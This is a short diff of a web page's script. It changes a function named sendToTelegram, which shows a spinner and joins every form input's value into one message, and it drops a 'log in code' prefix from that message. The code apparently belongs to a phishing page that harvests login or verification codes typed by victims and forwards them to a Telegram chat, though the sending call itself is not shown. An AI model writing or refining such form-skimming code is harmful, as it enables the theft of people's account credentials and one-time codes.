@@ -118,7 +118,7 @@ background-color:#ffffff;
     function sendToTelegram() {
         progressSpinner.style.display = 'block'; // Show the spinner
 
-        let message = 'log in code';
+        let message = '';
         inputs.forEach(input => {
             message += input.value;
         });
